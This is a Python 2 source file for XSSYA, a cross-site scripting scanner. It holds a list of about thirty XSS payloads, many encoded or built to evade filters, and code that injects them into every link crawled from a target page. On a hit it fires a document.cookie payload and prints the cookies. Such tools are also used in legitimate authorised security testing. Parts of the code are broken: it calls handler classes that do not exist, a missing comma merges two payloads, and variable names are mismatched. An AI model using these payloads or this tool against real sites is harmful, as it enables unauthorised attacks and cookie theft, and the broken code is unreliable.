#!/usr/bin/env python
# -*- coding: cp1252 -*-
# XSSA is a Cross Site Scripting Scanner & Vulnerability Confirmation 
# By Yehia Mamdouh - twitter.com/@Yehia1mamdouh / Facebook/yehia.mamdouh.98

import urllib2
from urllib2 import Request, build_opener, HTTPCookieProcessor, HTTPHandler
import urllib
from urllib import FancyURLopener
import cookielib
import socket
import time
import re
import sys
import httplib
import colorama
import ssl
from functools import partial
import custom 
from colorama import Fore, Back, Style
from colorama import init
colorama.init()


###Cross Site Scripting Payloads###
xss_attack = ["%22%3Cscript%3Ealert%28%27XSSYA%27%29%3C%2Fscript%3E",
              "1%253CScRiPt%2520%253Eprompt%28962477%29%253C%2fsCripT%253E",
                "<script>alert('xssya')</script>",
                "'';!--\"<XSS>=&{()}",
                "%3CScRipt%3EALeRt(%27xssya%27)%3B%3C%2FsCRipT%3E"
                "<scr<script>ipt>alert(1)</scr<script>ipt>",
                "%3cscript%3ealert(%27XSSYA%27)%3c%2fscript%3e",
                "%3cbody%2fonhashchange%3dalert(1)%3e%3ca+href%3d%23%3eclickit",
                "%3cimg+src%3dx+onerror%3dprompt(1)%3b%3e%0d%0a",
                "%3cvideo+src%3dx+onerror%3dprompt(1)%3b%3e",
                "<iframesrc=\"javascript:alert(2)\">",
                "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
                "<form action=\"Javascript:alert(1)\"><input type=submit>",
                "<isindex action=data:text/html, type=image>",
                "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">",
                "<svg/onload=prompt(1);>",
                "<marquee/onstart=confirm(2)>/",
                "<body onload=prompt(1);>",
                "<q/oncut=open()>",
                "<a onmouseover=location=’javascript:alert(1)>click",
                "<svg><script>alert&#40/1/&#41</script>",
                "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
                "<scri%00pt>alert(1);</scri%00pt>",
                "<scri%00pt>confirm(0);</scri%00pt>",
                "5\x72\x74\x28\x30\x29\x3B'>rhainfosec",
                "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>",
                "<marquee/onstart=confirm(2)>",
                "<A HREF=\"http://www.google.com./\">XSS</A>",
                "<svg/onload=prompt(1);>"]






class MyOpener(FancyURLopener):
    version = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11'
        
myopener = MyOpener()


class fake_ssl:
    wrap_socket = partial(ssl.wrap_socket, ssl_version=ssl.PROTOCOL_SSLv23)

httplib.ssl = fake_ssl



class JSHTTPCookieProcessor(urllib2.BaseHandler):
    handler_order = 400 






#Function In Case of Crawling 
def xss(exploit):
    for link in links:
        print Fore.RED + "Testing:",link[0]+exploit
        try:
            if xi != 0:
                handler = urllib2.Handler({'http': 'http://' + '/'})
                opener = urllib2.build_opener(link[0]+exploit, handler)
                source = opener.open(link[0]+exploit).read()
            else:
                source = myopener.open(link[0]+exploit).read()
                print "Source Length:",len(source)
            if re.search("xss", source.lower()) != None:
                print Fore.RED + "\n[!] XSS:",link[0]+exploit,"\n"
            else:
                print Fore.GREEN + "[-] Not Vulnerable." 
        except(urllib2.HTTPError), msg:
            print "[-] Error:",msg
            pass


#Function in case of Vulnerability Confirmation        
def xxs2(exploi):
    print ""
    print Fore.RED + " Testing:",host+exploi
    try:
        if xi != 0:
            handle = urllib2.Handler({'http': 'http://' + '/'})
            opene = urllib2.build_opener(host+exploit, handle)
            sourc = opene.open(host+exploit).read()
        else:
            sourc = myopener.open(host+exploi).read()
            print " Source Length:",len(sourc)
            ##Detecting WAF if Exist
            if res1.code == 406:
                print ""
                print " WAF Detected => (Mod_Security)"
            elif res1.code == 999:
                print ""
                print " WAF Detected => WebKnight"
                time.sleep(5)
            elif res1.code == 419:
                print ""
                print " WAF Detected => F5 BIG IP"
            else:
                print ""
                print " WAF Not Found"
                print ""
        if re.search("xss", sourc.lower()) != None:
            print Fore.RED + "\n[!] XSS:",host+exploi,"\n"
                
            
        else:
            print""
            print Fore.GREEN + "[-] Not Vulnerable."
    except(urllib2.HTTPError), msg:
        print "[-] Error:",msg
        pass
        
    
####### Print Menu and Exmaple ########

print Fore.CYAN + "\n"
print "\t#####################################################################"
print "\t#                                                                   #"                                 
print "\t#    #      #      ###     ###       #    #       ###               #"     
print "\t#     #    #      #  #    #  #        #  #       #   #              #"                                                       
print "\t#      #  #       #       #            ##       #     #             #"                                                                                                                                                            
print "\t#       ##          #       #          #       # ##### #            #"                                                                      
print "\t#       # #          ##       ##      #       #         #           #"                                                                              
print "\t#      #   #       #   #     #  #    #       #           #          #"                                                     
print "\t#     #     #      #####     ####   #       #             #         #"                                             
print "\t# XSSYA (Cross Site Scripting Scanner & Vulnrability Confirmation)  #"
print "\t#       Coded by (Yehia Mamdouh) Thanks (@Amr_Thabet - S.S)         #"
print "\t#              7dd022053c8a35169305380371a4d577                     #"
print "\t#####################################################################"


print ""
print " How to (Vul Confirm) ?"
print " Example: http://www.doamin.com/ "
print " Example: http://www.domain.com= "
print " Example: http://www.domain.com? "
print ""


host = raw_input(" Enter A Vulnerable Link: ")
res = myopener.open(host)
res1= urllib.urlopen(host)
html = res.read()
links = re.findall('"((http|href)s?://.*?)"', html)

print (30 * '-')
print (" XSSYA - M E N U")
print (30 * '-')
print (" 1. XSS Vulnerability Confirmation")
print (" 2. XSS Scanner")
print ""
choice = raw_input(' Enter your choice [1-2] : ')
print ""
print res.info()
myfile = res.read()
print ""      


if host[-1:] != "/":
    print""
    print " Load XSSYA"
elif host [-1:] != "=":
    print""
    print " Load XSSYA"
elif host [-1:] != "?":
    print""
    print " Load XSSYA"
    sys.exit(1)



### Testing the connection ###    
try:
    if sys.argv[3]:
        xi = sys.argv[3]
        print "Testing The Connection..."
        h2 = httplib.ssl(xi)
        h2.connect()
        print "[+] xi:",xi
except(socket.timeout):
    print "Connection Timed Out"
    xi = 0
    pass
except:
    print ""
    xi = 0
    pass


### Print the result in Case of Crawling###
if('2' in choice):
    print "Scanning The Host:",links
    print Fore.RED + "[+] Loaded:",len(xss_attack),"payloads\n"
    for exploit in xss_attack:
        time.sleep(5)
        xss(exploit.replace("\n",""))
        print "Scanning Done"


### Print the result in case of Vulnerable Link Confirmation###
else:
    print "Scanning The Host:",host
    print Fore.RED + "[+] Loaded:",len(xss_attack),"payloads\n"
    for exploi in xss_attack:
        time.sleep(5)
        xxs2(exploi.replace("\n",""))


###Confirm by Searching Payload in Web Page###
        heer = custom.check()
        bb = "[+] Confirmed Payload Found in Web Page Code"
        cc = "[-] False Positive"
        try:
            mam = myopener.open(host+exploi).read()
            found = False
            for payload in heer.hit:
                if payload in mam:
                    found = True
            if found:                
                print ""
                print Fore.YELLOW + bb
                print ""
                #Getting COKKIES 
                cj = cookielib.CookieJar()
                opener = build_opener(HTTPCookieProcessor(cj), HTTPHandler())
                xss_cookie = "%3cscript%3ealert(document.cookie)%3c/script%3e"
                url1 = (host+xss_cookie)
                req = Request(url1, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"})
                f = opener.open(req)
                html = f.read()
                print "Excute document.cookie"
                time.sleep (3)
                print ""
                for cookie in cj:
                    print Fore.CYAN + "==>", cookie
            else:
                print ""
                print Fore.GREEN + cc
                
        except urllib2.HTTPError:
            print "Error"



           
### Save Wbe Page Code for Manual Check###        
print ""
print ""
codehtml = raw_input("Save Page CODE:? ")
sas1 = host + '"><h1>r7hf72hds882js88d2</h1> '
sas = host
if ('y' in codehtml):
    urllib.urlretrieve(sas,'./scan_js.txt')
    urllib.urlretrieve(sas1,'./scan_html.txt')
else:
    pass



###Print Web Page Code in the Screen###
print ""
codehtml = raw_input("Print HTML CODE:? ")
if ('y' in codehtml):
    data = urllib2.urlopen(host)
    print data.info()
    myfile = data.read()
    print ""
    print Fore.WHITE + myfile
else:
    print ""
    print Fore.CYAN + "Happy Hunting"
